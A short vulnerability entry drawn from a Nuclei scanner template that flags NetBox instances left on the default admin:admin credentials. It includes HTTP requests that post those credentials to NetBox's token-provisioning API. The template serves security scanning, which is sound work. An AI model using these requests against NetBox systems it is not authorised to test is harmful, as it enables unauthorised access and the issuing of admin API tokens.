# Vulnerability: NetBox - Default Admin Credentials
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`netbox-default-login.yaml`)

## Description
Detected that NetBox was using the default credentials admin:admin. The official netbox-docker deployment set SUPERUSER_NAME=admin and SUPERUSER_PASSWORD=admin by default.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login/ HTTP/1.1
Host: {{Hostname}}
Accept: text/html

POST /api/users/tokens/provision/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: application/json

{"username":"{{username}}","password":"{{password}}"}
```

